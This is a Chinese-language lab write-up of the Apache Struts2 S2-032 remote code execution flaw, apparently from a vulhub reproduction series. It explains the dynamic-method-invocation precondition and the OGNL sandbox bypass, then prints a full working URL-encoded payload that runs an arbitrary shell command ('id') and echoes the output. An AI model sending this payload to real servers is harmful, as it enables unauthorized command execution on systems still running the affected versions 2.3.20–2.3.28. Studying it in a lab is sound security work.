# Struts2_032_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​		Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与 ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。

1 前提：开启动态方法调用。

<constant name="struts.enable.DynamicMethodInvocation" value="true" />

  假如动态方法调用已经开启,然后我们要调用对应的login方法的话 我们可以通过http://localhost:8080/struts241/index!login.action来执行动态的方法调用。这种动态方法调用的时候method中的特殊字符都会被替换成空，但是可以通过[http://localhost:8080/struts241/index.action?method:login来绕过无法传入特殊字符的限制](http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6)。

接收到的参数会经过处理存入到ActionMapping的method属性中。DefaultActionProxyFactory将ActionMappping的method属性设置到ActionProxy中的method属性，而DefaultActionInvocation.java中会把ActionProxy中的method属性取出来放入到ognlUtil.getValue(methodName + “()”, getStack().getContext(), action);方法中执行ognl表达式，沙盒绕过，通过ognl表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性，并将获取的结果覆盖_memberAccess属性，这样就可以绕过SecurityMemberAccess的限制。

​			影响版本

  		2.3.20 - 2.3.28

### 0x02漏洞复现

#### payload1(RCE)：

method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=**id**



​			**登录界面**

![S2_032_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_032_rce_1.jpg)

​			**Burpsuite改包重放，有回显，发现id被执行**

![S2_032_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_032_rce_2.jpg)



### 0x03参考资料

https://blog.csdn.net/qq_29277155/article/details/51285564
